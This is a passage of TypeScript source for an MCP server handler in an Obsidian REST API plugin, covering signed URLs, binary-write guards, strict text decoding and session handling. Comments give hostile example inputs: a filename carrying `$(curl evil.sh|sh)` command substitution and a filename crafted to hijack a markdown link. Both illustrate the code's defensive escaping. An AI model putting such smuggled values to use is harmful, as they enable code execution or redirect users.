import { McpServer, createMcpHandler, isLegacyRequest } from "@modelcontextprotocol/server";
import type {
  CacheHint,
  CallToolResult,
  McpHttpHandler,
  ReadResourceResult,
  RegisteredTool,
  StandardSchemaWithJSON,
  ToolAnnotations,
} from "@modelcontextprotocol/server";
import { NodeStreamableHTTPServerTransport, toNodeHandler, toWebRequest } from "@modelcontextprotocol/node";
import type { NodeMcpRequestHandler } from "@modelcontextprotocol/node";
import { randomUUID } from "crypto";
import { AsyncLocalStorage } from "async_hooks";
import { z } from "zod";
import express from "express";
import mime from "mime-types";
import { TFile } from "obsidian";
import { dedent } from "ts-dedent";

import { VaultOperations } from "./vaultOperations";
import type { InstructionInput, ReadTarget } from "markdown-patch-2";
import { InstructionInputObjectSchema } from "markdown-patch-2";
import openapiYaml from "../docs/openapi.yaml";
import { toStandardSchema } from "./mcpSchema";
import { MaximumMcpBinaryBytes } from "./constants";
import { assertVaultPathIsContained } from "./vaultPath";
import { LocalRestApiSettings } from "./types";
import {
  EVENT_EMITTERS,
  EventStreams,
  STREAMABLE_EVENTS,
  isStreamableEvent,
} from "./events";
import {
  UrlSigner,
  buildSignedUrl,
  clampSignedUrlTtl,
  normalizeVaultFilePath,
  requestBaseUrl,
} from "./signedUrls";
import {
  CanvasImageScaler,
  ImageScaler,
  MaximumImageEdge,
  ModelReadableImageTypes,
  isCanvasImageScalingAvailable,
} from "./imageScaling";

const SERVER_INFO = { name: "obsidian-local-rest-api", version: "1.0.0" };

// Freshness hints stamped onto every cacheable 2026-07-28 result. The vault is local and
// changes under the client's feet, so nothing is advertised as `public` — a shared proxy
// must never hand one vault's listing to another client — and the lifetimes are short
// enough that a stale answer is measured in seconds. `server/discover` is the exception:
// the tool/resource capability set only changes when a plugin registers a tool.
const CACHE_HINTS = {
  "server/discover": { ttlMs: 300_000, cacheScope: "private" },
  "tools/list": { ttlMs: 60_000, cacheScope: "private" },
  "resources/list": { ttlMs: 60_000, cacheScope: "private" },
  "resources/templates/list": { ttlMs: 60_000, cacheScope: "private" },
  "resources/read": { ttlMs: 60_000, cacheScope: "private" },
} as const satisfies Record<string, CacheHint>;

interface ToolSpec {
  name: string;
  description: string;
  // Converted from the registered zod shape once, not per request: a request builds a
  // whole server from these specs, and the shape never changes after registration.
  inputSchema: StandardSchemaWithJSON<Record<string, unknown>, Record<string, unknown>>;
  annotations: ToolAnnotations;
  callback: (args: unknown) => Promise<CallToolResult>;
}

// Shared annotation set for tools that only ever read vault/workspace state.
const READ_ONLY_ANNOTATIONS: ToolAnnotations = {
  readOnlyHint: true,
  destructiveHint: false,
  idempotentHint: true,
  openWorldHint: false,
};

// Some MCP clients do not resolve anyOf parameter schemas and forward the raw
// JSON text of an array argument as a plain string, which the `target` union's
// string branch then accepts (#315). When a heading target arrives as a string,
// recover the intended value: returns the parsed array (or null, vault_patch's
// document root) when the string is the JSON encoding of one, and undefined
// when it isn't.
function parseStringHeadingTarget(target: string): string[] | null | undefined {
  let parsed: unknown;
  try {
    parsed = JSON.parse(target);
  } catch {
    return undefined;
  }
  if (parsed === null) return null;
  if (Array.isArray(parsed) && parsed.every((item) => typeof item === "string")) {
    return parsed;
  }
  return undefined;
}

const HEADING_TARGET_STRING_HINT =
  "received a string that is not the JSON encoding of an array — if you did pass an array, your MCP client may not support anyOf-typed tool parameters";

// Mime types whose files are never text, by extension. `vault_write` and `vault_append`
// refuse a path with one of these, since the text they would write cannot be the file
// the extension promises, and the usual way this happens — a lossy `vault_read` of an
// attachment written back — destroys the attachment. The list is deliberately short:
// a false positive here blocks a legitimate write, a false negative only means the
// guard did not fire. SVG is the one `image/` type that is text (XML), so it is exempt.
const SVG_MIME_TYPE = "image/svg+xml";
const BINARY_MIME_PREFIXES = ["image/", "audio/", "video/", "font/"];
const BINARY_MIME_TYPES: ReadonlySet<string> = new Set([
  "application/pdf",
  "application/octet-stream",
  "application/wasm",
]);

// Archives are matched by shape as well as by name. An explicit list was already wrong --
// `.bz2` and `.xz` resolve to `application/x-bzip2` and `application/x-xz`, neither of
// which was in it -- and mime-db knows dozens more, every `epub+zip`, `usdz+zip` and
// vendor container among them. Two patterns cover the families, and the set holds the
// plain names that match neither.
const ARCHIVE_MIME_TYPES: ReadonlySet<string> = new Set([
  "application/zip",
  "application/gzip",
  "application/tar",
  "application/zstd",
  "application/x-tar",
  "application/x-gtar",
  "application/x-ustar",
  "application/x-gzip",
  "application/x-compress",
  "application/x-bzip",
  "application/x-bzip2",
  "application/x-xz",
  "application/x-arj",
  "application/x-stuffit",
  "application/x-stuffitx",
  "application/x-iso9660-image",
  "application/vnd.rar",
  "application/vnd.comicbook-rar",
  "application/vnd.laszip",
  "application/vnd.dece.zip",
]);

function isArchiveMimeType(type: string): boolean {
  return (
    /\+(?:zip|gzip)$/.test(type) || // epub+zip, usdz+zip, every vendor container
    /-compressed$/.test(type) || // x-7z-compressed, x-lzh-compressed, ms-cab-compressed
    ARCHIVE_MIME_TYPES.has(type)
  );
}

function binaryMimeTypeFor(path: string): string | null {
  const type = mime.lookup(path);
  if (!type) return null;
  // SVG is exempt because it is XML, but only *uncompressed* SVG. `mime-types` maps the
  // `.svgz` extension to image/svg+xml as well, and that is a gzip stream -- exempting by
  // MIME type alone let `vault_write` overwrite an .svgz attachment with UTF-8 text,
  // which is exactly the corruption this guard exists to stop. Match the extension.
  if (type === SVG_MIME_TYPE && /\.svg$/i.test(path)) return null;
  if (BINARY_MIME_PREFIXES.some((prefix) => type.startsWith(prefix))) return type;
  if (isArchiveMimeType(type)) return type;
  return BINARY_MIME_TYPES.has(type) ? type : null;
}

// The text tools refuse to write what cannot be text: a path whose extension names a
// binary type, or content carrying a NUL byte, which no text file has.
function assertTextWrite(path: string, content: string): void {
  const binaryType = binaryMimeTypeFor(path);
  if (binaryType !== null) {
    throw new Error(
      `Refusing to write ${path} as text: its extension says it is ${binaryType}, and writing text there would corrupt it. Upload the bytes instead: vault_get_upload_url gives a URL to PUT the file to (when signed URLs are enabled), or PUT /vault/<path> over the REST API with the API key.`,
    );
  }
  if (content.includes("\0")) {
    throw new Error(
      `Refusing to write ${path}: the content contains a NUL byte, so it is not text. Upload the bytes with vault_get_upload_url or PUT /vault/<path> over the REST API.`,
    );
  }
}

// A file that is not text still "reads" through Obsidian's own reader: it decodes as
// UTF-8 and substitutes U+FFFD for every malformed byte sequence rather than failing, so
// `vault_read` on a PNG hands back a lossy string and reports success. Write that string
// back through `vault_write` and the file is destroyed, with nothing along the way
// looking like an error.
//
// So `vault_read` decodes the bytes itself, with a decoder that throws instead of
// substituting. That is the exact question the tool needs answered — would handing this
// back as a string lose bytes? — rather than a guess at what the file is, and it is one
// read: the same bytes then serve the content, which is why every read path below takes
// the text it produced instead of reading the file again.
//
// `ignoreBOM` keeps a leading U+FEFF in the string rather than swallowing it, so what a
// caller reads is byte-for-byte what a `vault_write` of it would put back, and so a
// BOM-carrying note reads exactly as it did before this check existed.
function decodeUtf8Strict(bytes: ArrayBuffer, path: string): string {
  try {
    return new TextDecoder("utf-8", { fatal: true, ignoreBOM: true }).decode(bytes);
  } catch {
    throw new Error(
      `Refusing to read ${path} as text: its bytes are not valid UTF-8, so decoding them loses data and the content returned here could not be written back without destroying the file. Read it with vault_read_binary, or fetch the raw bytes over the REST API with GET /vault/<path>.`,
    );
  }
}

// How `vault_read_binary` should hand a file back. `auto` picks by type: a raster image
// becomes an `image` block, an SVG is passed through unchanged as its source text, and
// anything else becomes a signed link (when enabled) or embedded bytes (when small
// enough).
type BinaryReadMode = "auto" | "bytes" | "link";

const SIGNED_URLS_DISABLED_HINT =
  'Signed URLs are disabled. Turn on "Enable signed URLs" under Settings → Local REST API → Advanced settings to use them.';

/** The URI an embedded vault resource is labelled with. Not fetchable; a name for the bytes. */
function vaultResourceUri(normalizedPath: string): string {
  return `obsidian://local-rest-api/vault/${normalizedPath.split("/").map(encodeURIComponent).join("/")}`;
}

/**
 * A markdown link whose label is a vault filename and whose destination is a signed URL.
 *
 * The label is untrusted input. A file named `report](https://example.invalid/).pdf`
 * closes the label early, and the text then renders as a link to wherever the *filename*
 * says while the structured `resource_link` beside it still points at the vault -- so a
 * crafted attachment could choose where a reader is sent. That matters more here than it
 * looks: the tool descriptions ask an agent to repeat this link in its own reply, which
 * is precisely where it would be rendered and clicked.
 *
 * The characters that shape a link (`\`, `[`, `]`, `<`, `>`) and the inline-formatting
 * ones (`` ` ``, `*`, `_`) are backslash-escaped, which CommonMark permits for any ASCII
 * punctuation. Newlines are folded to spaces, since a label cannot span lines. The
 * destination is already percent-encoded segment by segment, but `encodeURIComponent`
 * leaves `(` and `)` alone and an unbalanced `)` ends the destination early, so those two
 * are encoded here; the REST side decodes them back.
 */
export function markdownLink(label: string, url: string): string {
  const escapedLabel = label
    .replace(/[\\[\]<>`*_]/g, (c) => `\\${c}`)
    .replace(/[\r\n]+/g, " ");
  const safeUrl = url.replace(/\(/g, "%28").replace(/\)/g, "%29");
  return `[${escapedLabel}](${safeUrl})`;
}

function filenameOf(path: string): string {
  return path.includes("/") ? path.slice(path.lastIndexOf("/") + 1) : path;
}

/**
 * Quote a string so a POSIX shell reads it as one literal word.
 *
 * This exists because `JSON.stringify` looked close enough and is not: it produces a
 * *double*-quoted string, and a shell still expands `$`, backticks and `$(...)` inside
 * double quotes. A vault file named `$(curl evil.sh|sh).png` therefore turned the
 * ready-to-run command this handler advertises into arbitrary code execution the moment
 * someone pasted it. Single quotes suppress every expansion; the only character that
 * cannot appear inside them is `'` itself, which is closed, escaped, and reopened.
 */
export function shellQuote(value: string): string {
  // Written as plain strings, not a template literal: inside a template literal `\'`
  // collapses to a bare `'` and the backslash this depends on is silently lost.
  return "'" + value.split("'").join("'\\''") + "'";
}

interface ResourceSpec {
  name: string;
  uri: string;
  meta: { mimeType?: string; description?: string };
  handler: (uri: URL) => Promise<ReadResourceResult>;
}

/**
 * A live sessionful-leg session: one client's `initialize` handshake, the server instance
 * pinned to it, and the handles needed to add or drop tools on that instance while it
 * is connected. The sessionless leg never produces one of these.
 */
interface Session {
  server: McpServer;
  transport: NodeStreamableHTTPServerTransport;
  toolHandles: Map<string, RegisteredTool>;
}

// The path parameter reads the same on every tool that takes one, so it is spelled once
// here rather than retyped per tool.
const VAULT_PATH_DESCRIPTION = "File path relative to vault root";
const SOURCE_VAULT_PATH_DESCRIPTION = "Source file path relative to vault root";

export class McpHandler {
  // The tool and resource registries are this handler's application state: the 2026-07-28
  // revision has no protocol-level session to hang anything off, so everything a request
  // needs must be reachable from the handler itself. `buildServer()` replays them onto a
  // fresh server for every request.
  private readonly toolSpecs: Map<string, ToolSpec> = new Map();
  private readonly resourceSpecs: ResourceSpec[] = [];

  // The sessionless leg, serving protocol revision 2026-07-28. `legacy: "reject"` keeps
  // it strictly sessionless: every request is answered on its own, with no session id
  // and no cross-request state. `handleRequest` routes `initialize`-based traffic to the
  // separate sessionful leg below.
  private readonly sessionlessHandler: McpHttpHandler;
  private readonly sessionlessNodeHandler: NodeMcpRequestHandler;

  // The sessionful leg, serving protocol revisions 2024-10-07 through 2025-11-25, kept
  // deliberately separate from the sessionless one. Those revisions are sessionful by
  // definition: a client opens
  // with `initialize`, the server answers with an `Mcp-Session-Id`, and the capabilities
  // it advertises — including `tools.listChanged` — promise a live notification channel
  // for the rest of the session. Serving those clients statelessly would make that
  // promise a lie and leave a tool an extension registers invisible until the client
  // happened to re-poll. The session map therefore lives here and only here; the
  // sessionless leg neither issues nor reads `Mcp-Session-Id`.
  private readonly sessions: Map<string, Session> = new Map();

  // The HTTP request a tool call arrived on. The SDK hands tool callbacks no view of
  // the transport, and the signed-URL tools need the request's scheme and Host to build
  // a URL the caller can actually reach, so `handleRequest` runs the SDK inside this
  // store and the callbacks read it back. Async context follows the request through the
  // SDK's own awaits, which is what makes it per-request rather than a shared field.
  private readonly requestContext = new AsyncLocalStorage<express.Request>();

  private readonly signer: UrlSigner;
  private readonly events: EventStreams | null;
  private readonly imageScaler: ImageScaler | null;
  // Handles for the tools that only exist while signed URLs are enabled, so the setting
  // can be toggled without rebuilding the handler.
  private signedUrlToolHandles: Array<{ remove: () => void }> = [];

  constructor(
    private readonly ops: VaultOperations,
    private readonly settings: LocalRestApiSettings,
    options: {
      signer?: UrlSigner;
      imageScaler?: ImageScaler | null;
      /** Where `events_get_listener_url` registers subscriptions; without it the tool is absent. */
      events?: EventStreams;
    } = {},
  ) {
    this.signer = options.signer ?? new UrlSigner();
    this.events = options.events ?? null;
    this.imageScaler =
      options.imageScaler !== undefined
        ? options.imageScaler
        : isCanvasImageScalingAvailable()
          ? new CanvasImageScaler()
          : null;
    const onerror = (error: Error) => this.logHandlerError(error);
    this.sessionlessHandler = createMcpHandler(() => this.buildServer().server, {
      legacy: "reject",
      onerror,
    });
    this.sessionlessNodeHandler = toNodeHandler(this.sessionlessHandler, { onerror });
    this.registerResources();
    this.registerTools();
    if (this.settings.enableSignedUrls) {
      this.registerSignedUrlTools();
    }
  }

  /**
   * Register or remove the tools that mint signed URLs, to match the setting. Called
   * by the settings tab when the toggle changes; connected clients learn of the change
   * through the usual list-changed notifications.
   */
  public setSignedUrlsEnabled(enabled: boolean): void {
    const registered = this.signedUrlToolHandles.length > 0;
    if (enabled && !registered) {
      this.registerSignedUrlTools();
    } else if (!enabled && registered) {
      for (const handle of this.signedUrlToolHandles) handle.remove();
      this.signedUrlToolHandles = [];
    }
  }

  private get signedUrlsEnabled(): boolean {
    return this.settings.enableSignedUrls === true;
  }

  private get signedUrlTtlSeconds(): number {
    return clampSignedUrlTtl(this.settings.signedUrlTtlSeconds);
  }

  private baseUrlFromRequest(): string {
    const req = this.requestContext.getStore();
    if (!req) {
      throw new Error(
        "Cannot build a URL for this server: the tool call did not arrive over HTTP.",
      );
    }
    return requestBaseUrl(req);
  }

  private signedUrlFor(
    method: "GET" | "PUT",
    normalizedPath: string,
    extraQuery: Record<string, string> = {},
  ): { url: string; expiresAt: string } {
    const params = this.signer.sign(method, normalizedPath, this.signedUrlTtlSeconds);
    return {
      url: buildSignedUrl(this.baseUrlFromRequest(), normalizedPath, params, extraQuery),
      expiresAt: new Date(params.exp * 1000).toISOString(),
    };
  }

  private normalizedFilePath(path: string): string {
    const normalized = normalizeVaultFilePath(path);
    if (normalized === null) {
      throw new Error(`Not a file path inside the vault: ${path}`);
    }
    return normalized;
  }

  private existingFile(path: string): TFile {
    const file = this.ops.app.vault.getAbstractFileByPath(path);
    if (!(file instanceof TFile)) throw new Error(`File not found: ${path}`);
    return file;
  }

  // A `resource_link` to a signed download URL, plus a markdown link in a text block for
  // clients that render only text. Addressed to the user: the model gains nothing from a
  // URL it cannot follow, and the link is for a person to click or a shell to fetch.
  private downloadLinkResult(path: string): CallToolResult {
    const normalized = this.normalizedFilePath(path);
    const file = this.existingFile(normalized);
    const mimeType = mime.lookup(normalized) || "application/octet-stream";
    const { url, expiresAt } = this.signedUrlFor("GET", normalized);
    const name = filenameOf(normalized);
    return {
      content: [
        {
          type: "resource_link",
          uri: url,
          name,
          mimeType,
          size: file.stat.size,
          description: `${normalized} (${mimeType}, ${file.stat.size} bytes); link expires ${expiresAt}`,
          // Both audiences, deliberately. The link is the whole point of the call, so the
          // model needs it to say what happened and to hand it on; the user needs it to
          // click. Marking it user-only would, in a client that honours `audience`, leave
          // the model unable to report the result of a tool it just ran. The spec's own
          // resource_link example annotates for the assistant for the same reason.
          //
          // `priority` ranks this above the text block below: 1 is "effectively required",
          // 0 "entirely optional", so a client with room for one of the two should keep
          // the structured link rather than its prose restatement.
          // `lastModified` is what `stat` already knows, in the field the spec has for it.
          annotations: {
            audience: ["user", "assistant"],
            priority: 0.9,
            lastModified: new Date(file.stat.mtime).toISOString(),
          },
        },
        {
          type: "text",
          // Deliberately thin: `mimeType` and `size` live on the resource_link block
          // immediately above, so repeating them here paid twice for one fact. What is
          // left is the markdown form of the link -- the thing an agent pastes into a
          // reply -- and the expiry, which is what decides whether it still works.
          text: `${markdownLink(name, url)} — link valid until ${expiresAt}.`,
          // The fallback for clients that do not render resource_link at all. It restates
          // the block above, so it is ranked low: a client that renders both shows the
          // same link twice, and this is the copy worth dropping.
          annotations: { audience: ["user", "assistant"], priority: 0.3 },
        },
      ],
    };
  }

  /** The one refusal for a file too big to inline, raised from the stat or the bytes. */
  private throwOversizedForEmbedding(size: number): never {
    throw new Error(
      `Refusing to embed ${size} bytes in the result: the limit is ${MaximumMcpBinaryBytes} bytes, because base64 costs roughly 0.35-0.45 tokens per byte of context. ` +
        (this.signedUrlsEnabled
          ? 'Call again with as: "link" for a signed download URL instead.'
          : `Fetch it over the REST API with GET /vault/<path>, or enable signed URLs to get a download link here. ${SIGNED_URLS_DISABLED_HINT}`),
    );
  }

  private embeddedBytesResult(
    normalizedPath: string,
    bytes: ArrayBuffer,
    mimeType: string,
  ): CallToolResult {
    if (bytes.byteLength > MaximumMcpBinaryBytes) {
      this.throwOversizedForEmbedding(bytes.byteLength);
    }
    return {
      content: [
        {
          type: "resource",
          resource: {
            uri: vaultResourceUri(normalizedPath),
            mimeType,
            blob: Buffer.from(bytes).toString("base64"),
          },
        },
      ],
    };
  }

  // An SVG is a vector drawing and also plain XML, so it goes through unchanged as text
  // rather than through the canvas: nothing is rasterized, nothing is resized, and the
  // model reads the markup it would have to reason about anyway. (It cannot be handed
  // over as an `image` block — the image input types are the raster ones in
  // `ModelReadableImageTypes` — and Chromium's `createImageBitmap` refuses an SVG with
  // no intrinsic size, so rasterizing was never a dependable path either.) Returns null
  // when the bytes are not UTF-8 or the file is over the embedding ceiling; the caller
  // then falls back to the link/bytes path like any other non-image file.
  private svgTextResult(normalizedPath: string, bytes: ArrayBuffer): CallToolResult | null {
    if (bytes.byteLength > MaximumMcpBinaryBytes) return null;
    let text: string;
    try {
      text = new TextDecoder("utf-8", { fatal: true, ignoreBOM: true }).decode(bytes);
    } catch {
      return null;
    }
    return {
      content: [
        {
          type: "resource",
          resource: {
            uri: vaultResourceUri(normalizedPath),
            mimeType: SVG_MIME_TYPE,
            text,
          },
        },
        {
          type: "text",
          text: JSON.stringify({ path: normalizedPath, mimeType: SVG_MIME_TYPE, size: bytes.byteLength }),
        },
      ],
    };
  }

  private async imageResult(
    normalizedPath: string,
    bytes: ArrayBuffer,
    mimeType: string,
  ): Promise<CallToolResult | null> {
    let data: Buffer;
    let outputType = mimeType;
    let dimensions: { width: number; height: number } | undefined;
    if (this.imageScaler) {
      try {
        const scaled = await this.imageScaler.scale(bytes, mimeType, MaximumImageEdge);
        data = scaled.data;
        outputType = scaled.mimeType;
        dimensions = { width: scaled.width, height: scaled.height };
      } catch {
        // Not something the renderer could decode (a corrupt file, a type the
        // extension lied about): it is not an image the model can look at either.
        return null;
      }
    } else if (ModelReadableImageTypes.has(mimeType) && bytes.byteLength <= MaximumMcpBinaryBytes) {
      // No scaler in this runtime: the original bytes go through as-is when the model
      // can read the type and the file is small enough to be worth it.
      data = Buffer.from(bytes);
    } else {
      return null;
    }
    // The size guard, applied to what actually goes on the wire rather than to the file
    // on disk. `fitWithin` only resizes an image whose long edge exceeds
    // `MaximumImageEdge`, so a large-but-not-wide image -- a detailed 1536x864 screenshot,
    // say -- comes back from the scaler as its original bytes, untouched. Without this
    // check that payload goes out at full size and takes the renderer down with it. See
    // `MaximumMcpBinaryBytes` for what happens above the limit.
    //
    // Returning null rather than throwing lets the caller fall back to a signed download
    // link, which costs the model nothing and still gets the bytes to whoever wants them.
    if (data.byteLength > MaximumMcpBinaryBytes) {
      return null;
    }
    return {
      content: [
        {
          type: "image",
          data: data.toString("base64"),
          mimeType: outputType,
          annotations: { audience: ["user", "assistant"], priority: 0.9 },
        },
        {
          type: "text",
          text: JSON.stringify({
            path: normalizedPath,
            mimeType,
            size: bytes.byteLength,
            ...dimensions,
          }),
        },
      ],
    };
  }

  // Build a fresh McpServer from the current specs. The sessionless leg discards the tool
  // handles (it builds one server per request, so nothing outlives the exchange); the
  // sessionful leg keeps them, because its server stays connected for a whole session and
  // has to learn about tools registered after the handshake.
  private buildServer(): { server: McpServer; toolHandles: Map<string, RegisteredTool> } {
    const server = new McpServer(SERVER_INFO, {
      capabilities: { tools: {}, resources: {} },
      cacheHints: CACHE_HINTS,
    });
    for (const spec of this.resourceSpecs) {
      server.registerResource(spec.name, spec.uri, spec.meta, spec.handler);
    }
    const toolHandles = new Map<string, RegisteredTool>();
    for (const spec of this.toolSpecs.values()) {
      toolHandles.set(spec.name, this.registerToolOn(server, spec));
    }
    return { server, toolHandles };
  }

  private registerToolOn(server: McpServer, spec: ToolSpec): RegisteredTool {
    return server.registerTool(
      spec.name,
      {
        description: spec.description,
        inputSchema: spec.inputSchema,
        annotations: spec.annotations,
      },
      spec.callback,
    );
  }

  /** A client-supplied vault path, refused if it resolves outside the vault root.
   *
   *  Returns the path so a call site reads as `this.ops.write(this.vaultPath(path))`
   *  -- the guard is then part of the expression that uses the path, and a new tool
   *  that forgets it is visibly different from every tool around it. VaultOperations
   *  checks again before touching the filesystem; this one exists so the client gets
   *  a refusal that names what was wrong instead of a bare failure. */
  private vaultPath(candidate: string, label = "Path"): string {
    assertVaultPathIsContained(candidate, label);
    return candidate;
  }

  private logHandlerError(error: Error): void {
    if (this.settings.enableVerboseLogging) {
      console.debug(`[MCP] request rejected: ${error.message}`);
    }
  }

  private addResourceSpec(name: string, uri: string, meta: { mimeType?: string; description?: string }, handler: (uri: URL) => Promise<ReadResourceResult>): void {
    this.resourceSpecs.push({ name, uri, meta, handler });
  }

  // Args is inferred from the callback's own parameter annotation; the zod shape is
  // adapted to the SDK's Standard Schema here, at registration time.
  private tool<Args>(name: string, description: string, schema: Record<string, z.ZodTypeAny>, annotations: ToolAnnotations, callback: (args: Args) => Promise<CallToolResult>): { remove: () => void } {
    const spec: ToolSpec = {
      name,
      description,
      inputSchema: toStandardSchema(schema),
      annotations,
      callback: async (args: unknown) => {
        try {
          const result = await callback(args as Args);
          if (this.settings.enableVerboseLogging) {
            console.debug(`[MCP] ${name} => ok`);
          }
          return result;
        } catch (e) {
          if (this.settings.enableVerboseLogging) {
            console.debug(`[MCP] ${name} => error`);
          }
          throw e;
        }
      },
    };
    this.toolSpecs.set(spec.name, spec);
    // Sessionless clients learn about the change through a `subscriptions/listen` stream;
    // sessionful sessions are live server instances, so the tool is registered on each of
    // them, which is what emits `notifications/tools/list_changed` on their stream.
    this.sessionlessHandler.notify.toolsChanged();
    for (const session of this.sessions.values()) {
      session.toolHandles.set(spec.name, this.registerToolOn(session.server, spec));
    }
    return {
      remove: () => {
        if (!this.toolSpecs.delete(spec.name)) return;
        this.sessionlessHandler.notify.toolsChanged();
        for (const session of this.sessions.values()) {
          session.toolHandles.get(spec.name)?.remove();
          session.toolHandles.delete(spec.name);
        }
      },
    };
  }

  public registerTool(
    name: string,
    description: string,
    schema: Record<string, z.ZodTypeAny>,
    callback: (args: Record<string, unknown>) => Promise<unknown>,
    annotations?: ToolAnnotations,
  ): () => void {
    if (this.toolSpecs.has(name)) {
      throw new Error(
        `Cannot register MCP tool "${name}" — a tool with this name is already registered.`,
      );
    }
    const registered = this.tool(name, description, schema, annotations ?? {}, async (args) =>
      this.text(await callback(args as Record<string, unknown>)),
    );
    return () => registered.remove();
  }

  /**
   * Whether a request belongs to the sessionless (2026-07-28) leg.
   *
   * Classification is the SDK's own — `isLegacyRequest` runs exactly the code
   * `createMcpHandler` runs — so nothing that branches on this can disagree with the
   * entry about who owns a request. Anything carrying the 2026-07-28 `_meta` envelope
   * claim is sessionless, including a claim naming a revision this server does not serve
   * or a malformed one: the sessionless leg owns those error answers (`-32022` / `-32602`).
   * Everything else — `initialize` handshakes, session GET/DELETE — belongs to the
   * sessionful leg.
   *
   * `req.body` is passed explicitly because the router's `express.json()` has already
   * drained the Node stream, which cannot be read a second time.
   */
  public async isSessionlessRequest(req: express.Request): Promise<boolean> {
    return !(await isLegacyRequest(await toWebRequest(req, req.body)));
  }

  /** Serve one request on the MCP endpoint. */
  async handleRequest(
    req: express.Request,
    res: express.Response,
  ): Promise<void> {
    await this.requestContext.run(req, async () => {
      if (await this.isSessionlessRequest(req)) {
        await this.sessionlessNodeHandler(req, res, req.body);
        return;
      }
      await this.handleSessionfulRequest(req, res);
    });
  }

  /**
   * The sessionful leg, for protocol revisions 2024-10-07 through 2025-11-25: a client
   * opens with `initialize` and is handed an `Mcp-Session-Id` to send back on every later
   * request. Requests naming a session that has since gone away are answered 404 so the
   * client knows to hand-shake again.
   */
  private async handleSessionfulRequest(
    req: express.Request,
    res: express.Response,
  ): Promise<void> {
    const sessionId = req.headers["mcp-session-id"] as string | undefined;

    if (!sessionId) {
      const { server, toolHandles } = this.buildServer();
      const transport = new NodeStreamableHTTPServerTransport({
        sessionIdGenerator: () => randomUUID(),
        onsessioninitialized: (id) => {
          this.sessions.set(id, { server, transport, toolHandles });
        },
        onsessionclosed: (id) => {
          this.sessions.delete(id);
        },
      });
      transport.onclose = () => {
        if (transport.sessionId) this.sessions.delete(transport.sessionId);
      };
      await server.connect(transport);
      await transport.handleRequest(req, res, req.body);
      return;
    }

    const session = this.sessions.get(sessionId);
    if (!session) {
      res.status(404).json({ error: "Session not found" });
      return;
    }
    await session.transport.handleRequest(req, res, req.body);
  }

  /**
   * Tears down the sessionless leg's in-flight exchanges and every open session.
   * Called when the plugin unloads.
   */
  public close(): void {
    const closing: Promise<unknown>[] = [this.sessionlessHandler.close()];
    for (const session of [...this.sessions.values()]) {
      closing.push(session.transport.close());
    }
    this.sessions.clear();
    void Promise.allSettled(closing).then((results) => {
      if (!this.settings.enableVerboseLogging) return;
      for (const result of results) {
        if (result.status === "rejected") {
          const reason: unknown = result.reason;
          console.debug(
            `[MCP] shutdown failed: ${reason instanceof Error ? reason.message : "unknown error"}`,
          );
        }
      }
    });
  }

  private text(data: unknown) {
    return {
      content: [
        {
          type: "text" as const,
          text:
            typeof data === "string" ? data : JSON.stringify(data, null, 2),
        },
      ],
    };
  }

  private getActiveFile(): TFile {
    const file = this.ops.app.workspace.getActiveFile();
    if (!file) throw new Error("No active file");
    return file;
  }

  // The one read behind every `vault_read`: raw bytes, decoded strictly. See
  // `decodeUtf8Strict` above for why the read is a binary one.
  private async readTextStrict(path: string): Promise<string> {
    return decodeUtf8Strict(await this.ops.readBinaryFileContent(path), path);
  }

  private registerResources(): void {
    this.addResourceSpec(
      "openapi-spec",
      "obsidian://local-rest-api/openapi.yaml",
      {
        mimeType: "application/yaml",
        description: dedent`Full OpenAPI specification for the Obsidian Local REST API. Contains complete request/response schemas, parameter descriptions, and usage examples for every endpoint.`,
      },
      async (uri: URL) => ({
        contents: [
          {
            uri: uri.href,
            mimeType: "application/yaml",
            text: openapiYaml,
          },
        ],
      }),
    );
  }

  // The tools that hand out signed URLs. Registered only while the setting is on, so a
  // client of a server where they are off never sees them.
  private registerSignedUrlTools(): void {
    this.signedUrlToolHandles = [
      this.tool(
        "vault_get_download_url",
        dedent`
          Return a signed, expiring URL for GET /vault/<path> as a resource_link, plus a markdown link. The URL needs no API key, so it can be opened in a browser or fetched with curl, and the bytes never pass through this conversation. Many clients do not surface a resource_link to the person at all, so when the file is for them rather than for you: if you can fetch a URL and put a local file in front of them, download it to scratch space and show them that file. The bytes then go from the vault to their screen without passing through your context, which is the cheapest route and the one this link exists to enable -- so do not read the downloaded file back in yourself, which would pay exactly the token cost the link avoids. Failing that, repeat the markdown link in your own reply, where it renders as something clickable, noting that this gets them a link rather than a picture: a markdown image does not display inline in a terminal client. Over HTTPS the browser must trust the plugin's certificate; the plain-HTTP port avoids that. Throws if the file does not exist.
        `,
        { path: z.string().describe("File path relative to vault root") },
        READ_ONLY_ANNOTATIONS,
        async ({ path }: { path: string }) => this.downloadLinkResult(path),
      ),
      this.tool(
        "vault_get_upload_url",
        dedent`
          Return a signed, single-use URL for PUT /vault/<path>, for uploading a file that exists on your host. The result includes a ready-to-run curl command. The Content-Type is informational: a signed upload stores exactly the bytes you send, whatever type you declare, so a pretty-printed .json keeps its whitespace instead of being reparsed and re-serialized. The URL needs no API key and expires; the request that succeeds consumes it. Creates missing parent directories and overwrites an existing file without warning.
        `,
        { path: z.string().describe("Destination file path relative to vault root") },
        { readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: false },
        async ({ path }: { path: string }) => {
          const normalized = this.normalizedFilePath(path);
          const mimeType = mime.lookup(normalized) || "application/octet-stream";
          const { url, expiresAt } = this.signedUrlFor("PUT", normalized);
          // Only what varies per call, plus the ready-to-run command. `method` and
          // `singleUse` used to be here and were dropped: both are constants this tool's
          // own description already states, so sending them cost a client tokens on every
          // call to be told again what it was told at registration. `path` stays because
          // it is the *normalized* target rather than an echo of the argument -- this tool
          // overwrites without warning, so what it resolved to is worth confirming.
          return this.text({
            url,
            path: normalized,
            contentType: mimeType,
            expiresAt,
            // Every interpolated part is shell-quoted, the URL included: `baseUrlFromRequest`
            // takes the host from the request, so a Host header carrying a quote or `$(...)`
            // would otherwise break out of the double quotes this used to use.
            command: `curl -X PUT -H ${shellQuote(`Content-Type: ${mimeType}`)} --data-binary @${shellQuote(filenameOf(normalized))} ${shellQuote(url)}`,
          });
        },
      ),
    ];
    if (this.events) {
      this.signedUrlToolHandles.push(this.registerEventListenerTool(this.events));
    }
  }

  private registerEventListenerTool(events: EventStreams): { remove: () => void } {
    const supported = EVENT_EMITTERS.map(
      (emitter) => `${emitter}: ${STREAMABLE_EVENTS[emitter].join(", ")}`,
    ).join("; ");
    return this.tool(
      "events_get_listener_url",
      dedent`
